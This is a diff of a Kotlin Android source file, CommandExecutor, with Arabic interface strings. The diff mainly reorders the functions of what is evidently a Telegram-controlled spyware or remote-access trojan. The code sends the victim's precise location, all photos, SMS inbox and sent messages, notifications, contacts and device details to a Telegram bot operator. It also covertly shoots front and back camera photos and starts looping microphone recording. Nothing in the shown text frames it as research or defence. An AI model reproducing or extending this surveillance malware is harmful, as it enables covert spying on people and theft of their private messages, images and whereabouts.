@@ -64,9 +64,165 @@ object CommandExecutor {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  جهات الاتصال
-    // ═══════════════════════════════════════════
+    private fun showMainMenu(ctx: Context) {
+        TelegramApi.sendMessage(
+            "🎛 *لوحة التحكم*\n\nاختر العملية من الأزرار 👇",
+            KeyboardBuilder.replyKeyboard()
+        )
+    }
+
+    private fun showDeviceInfo(ctx: Context) {
+        val info = DeviceInfo.getFullInfo(ctx)
+        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
+    }
+
+    private fun showLocation(ctx: Context) {
+        runJob(ctx, "location") {
+            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...*")
+            val loc = LocationHelper.getPreciseLocation(ctx)
+            val text = LocationHelper.formatLocation(ctx, loc)
+            TelegramApi.sendMessage(text, KeyboardBuilder.replyKeyboard())
+        }
+    }
+
+    private fun fetchAllPhotos(ctx: Context) {
+        runJob(ctx, "photos_all") {
+            val all = MediaScanner.scanImages(ctx)
+            sendMediaList(ctx, all, "📸 كل الصور")
+        }
+    }
+
+    private fun fetchLastPhotos(ctx: Context, n: Int) {
+        runJob(ctx, "photos_$n") {
+            val all = MediaScanner.scanImages(ctx).take(n)
+            sendMediaList(ctx, all, "📸 آخر $n صورة")
+        }
+    }
+
+    private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
+        if (list.isEmpty()) {
+            TelegramApi.sendMessage("📭 لا توجد صور", KeyboardBuilder.replyKeyboard())
+            return
+        }
+        var sent = 0
+        var failed = 0
+        for (item in list) {
+            val file = File(item.path)
+            if (!file.exists()) { failed++; continue }
+            val ok = TelegramApi.sendPhoto(file, item.name)
+            if (ok) sent++ else failed++
+        }
+        TelegramApi.sendMessage("$title — ${list.size}\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
+    }
+
+    private fun fetchAllMusic(ctx: Context) {
+        runJob(ctx, "music") {
+            val music = MediaScanner.scanAudio(ctx)
+            if (music.isEmpty()) {
+                TelegramApi.sendMessage("🎵 لا توجد موسيقى", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            val sb = StringBuilder()
+            sb.append("🎵 *قائمة الموسيقى* — ${music.size}\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+            var count = 0
+            for (m in music) {
+                sb.append("🎼 ${m.name}\n")
+                sb.append("   ${m.size / 1024 / 1024} MB\n\n")
+                count++
+                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
+                if (count >= 100) break
+            }
+            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
+        }
+    }
+
+    private fun captureCamera(ctx: Context, front: Boolean) {
+        runJob(ctx, "cam") {
+            val label = if (front) "أمامية 🤳" else "خلفية 📸"
+            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
+            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
+            if (file != null && file.exists()) {
+                TelegramApi.sendPhoto(file, "📷 صورة ($label)")
+                file.delete()
+            } else {
+                TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.replyKeyboard())
+            }
+        }
+    }
+
+    private fun startAudio(ctx: Context) {
+        if (AudioRecorder.isRunning()) {
+            TelegramApi.sendMessage("🎤 شغّال بالفعل")
+            return
+        }
+        AudioRecorder.startLoop(ctx)
+        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل", KeyboardBuilder.replyKeyboard())
+    }
+
+    private fun stopAudio(ctx: Context) {
+        AudioRecorder.stopLoop(ctx)
+        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
+    }
+
+    private fun fetchAllSms(ctx: Context) {
+        runJob(ctx, "sms_all") {
+            val inbox = SmsReader.scanAll(ctx)
+            val sent = SmsReader.scanSent(ctx)
+            val all = (inbox + sent).sortedByDescending { it.optString("date") }
+            if (all.isEmpty()) {
+                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            val grouped = all.groupBy { it.optString("address", "unknown") }
+            val sb = StringBuilder()
+            sb.append("📩 *SMS* — ${all.size}\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+            for ((address, msgs) in grouped) {
+                sb.append("📞 *$address* (${msgs.size})\n")
+                for (m in msgs.take(5)) {
+                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
+                    sb.append("  $type ${m.optString("body", "").take(80)}\n")
+                }
+                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
+                sb.append("\n")
+                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
+            }
+            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
+        }
+    }
+
+    private fun fetchAllNotifs(ctx: Context) {
+        runJob(ctx, "notifs") {
+            val lines = DataStore.readNotifications(ctx, limit = 5000)
+            val notifs = lines.mapNotNull { line ->
+                try { val obj = JSONObject(line); if (obj.optString("type") == "notif") obj else null }
+                catch (_: Exception) { null }
+            }
+            if (notifs.isEmpty()) {
+                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
+            val sb = StringBuilder()
+            sb.append("🔔 *الإشعارات* — ${notifs.size}\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+            for ((pkg, items) in grouped) {
+                sb.append("📱 *$pkg* (${items.size})\n")
+                for (n in items.take(5)) {
+                    val t = n.optString("title", "")
+                    val tx = n.optString("text", "")
+                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
+                    if (tx.isNotBlank()) sb.append("    $tx\n")
+                }
+                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
+                sb.append("\n")
+                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
+            }
+            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
+        }
+    }
+
     private fun fetchContacts(ctx: Context) {
         runJob(ctx, "contacts") {
             TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")
@@ -111,189 +267,6 @@ object CommandExecutor {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  الأوامر
-    // ═══════════════════════════════════════════
-    private fun showMainMenu(ctx: Context) {
-        TelegramApi.sendMessage(
-            "🎛 *لوحة التحكم*\n\nاختر العملية من الأزرار 👇",
-            KeyboardBuilder.replyKeyboard()
-        )
-    }
-
-    private fun showDeviceInfo(ctx: Context) {
-        val info = DeviceInfo.getFullInfo(ctx)
-        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
-    }
-
-    private fun showLocation(ctx: Context) {
-        runJob(ctx, "location") {
-            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...*")
-            val loc = LocationHelper.getPreciseLocation(ctx)
-            val text = LocationHelper.formatLocation(ctx, loc)
-            TelegramApi.sendMessage(text, KeyboardBuilder.replyKeyboard())
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  الصور
-    // ═══════════════════════════════════════════
-    private fun fetchAllPhotos(ctx: Context) {
-        runJob(ctx, "photos_all") {
-            val all = MediaScanner.scanImages(ctx)
-            sendMediaList(ctx, all, "📸 كل الصور")
-        }
-    }
-
-    private fun fetchLastPhotos(ctx: Context, n: Int) {
-        runJob(ctx, "photos_$n") {
-            val all = MediaScanner.scanImages(ctx).take(n)
-            sendMediaList(ctx, all, "📸 آخر $n صورة")
-        }
-    }
-
-    private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
-        if (list.isEmpty()) {
-            TelegramApi.sendMessage("📭 لا توجد صور", KeyboardBuilder.replyKeyboard())
-            return
-        }
-        var sent = 0
-        var failed = 0
-        for (item in list) {
-            val file = File(item.path)
-            if (!file.exists()) { failed++; continue }
-            val ok = TelegramApi.sendPhoto(file, item.name)
-            if (ok) sent++ else failed++
-        }
-        TelegramApi.sendMessage("$title — ${list.size}\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
-    }
-
-    // ═══════════════════════════════════════════
-    //  الموسيقى
-    // ═══════════════════════════════════════════
-    private fun fetchAllMusic(ctx: Context) {
-        runJob(ctx, "music") {
-            val music = MediaScanner.scanAudio(ctx)
-            if (music.isEmpty()) {
-                TelegramApi.sendMessage("🎵 لا توجد موسيقى", KeyboardBuilder.replyKeyboard())
-                return@runJob
-            }
-            val sb = StringBuilder()
-            sb.append("🎵 *قائمة الموسيقى* — ${music.size}\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
-            var count = 0
-            for (m in music) {
-                sb.append("🎼 ${m.name}\n")
-                sb.append("   ${m.size / 1024 / 1024} MB\n\n")
-                count++
-                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
-                if (count >= 100) break
-            }
-            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  الكاميرا
-    // ═══════════════════════════════════════════
-    private fun captureCamera(ctx: Context, front: Boolean) {
-        runJob(ctx, "cam") {
-            val label = if (front) "أمامية 🤳" else "خلفية 📸"
-            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
-            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
-            if (file != null && file.exists()) {
-                TelegramApi.sendPhoto(file, "📷 صورة ($label)")
-                file.delete()
-            } else {
-                TelegramApi.sendMessage("❌ فشل التصوير — تأكد من صلاحية الكاميرا", KeyboardBuilder.replyKeyboard())
-            }
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  الصوت
-    // ═══════════════════════════════════════════
-    private fun startAudio(ctx: Context) {
-        if (AudioRecorder.isRunning()) {
-            TelegramApi.sendMessage("🎤 شغّال بالفعل")
-            return
-        }
-        AudioRecorder.startLoop(ctx)
-        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل كل 10 ثواني", KeyboardBuilder.replyKeyboard())
-    }
-
-    private fun stopAudio(ctx: Context) {
-        AudioRecorder.stopLoop(ctx)
-        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
-    }
-
-    // ═══════════════════════════════════════════
-    //  SMS
-    // ═══════════════════════════════════════════
-    private fun fetchAllSms(ctx: Context) {
-        runJob(ctx, "sms_all") {
-            val inbox = SmsReader.scanAll(ctx)
-            val sent = SmsReader.scanSent(ctx)
-            val all = (inbox + sent).sortedByDescending { it.optString("date") }
-            if (all.isEmpty()) {
-                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.replyKeyboard())
-                return@runJob
-            }
-            val grouped = all.groupBy { it.optString("address", "unknown") }
-            val sb = StringBuilder()
-            sb.append("📩 *SMS* — ${all.size}\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
-            for ((address, msgs) in grouped) {
-                sb.append("📞 *$address* (${msgs.size})\n")
-                for (m in msgs.take(5)) {
-                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
-                    sb.append("  $type ${m.optString("body", "").take(80)}\n")
-                }
-                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
-                sb.append("\n")
-                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
-            }
-            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  الإشعارات
-    // ═══════════════════════════════════════════
-    private fun fetchAllNotifs(ctx: Context) {
-        runJob(ctx, "notifs") {
-            val lines = DataStore.readNotifications(ctx, limit = 5000)
-            val notifs = lines.mapNotNull { line ->
-                try { val obj = JSONObject(line); if (obj.optString("type") == "notif") obj else null }
-                catch (_: Exception) { null }
-            }
-            if (notifs.isEmpty()) {
-                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.replyKeyboard())
-                return@runJob
-            }
-            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
-            val sb = StringBuilder()
-            sb.append("🔔 *الإشعارات* — ${notifs.size}\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
-            for ((pkg, items) in grouped) {
-                sb.append("📱 *$pkg* (${items.size})\n")
-                for (n in items.take(5)) {
-                    val t = n.optString("title", "")
-                    val tx = n.optString("text", "")
-                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
-                    if (tx.isNotBlank()) sb.append("    $tx\n")
-                }
-                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
-                sb.append("\n")
-                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
-            }
-            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  الشامل
-    // ═══════════════════════════════════════════
     private fun fetchEverything(ctx: Context) {
         runJob(ctx, "all") {
             TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
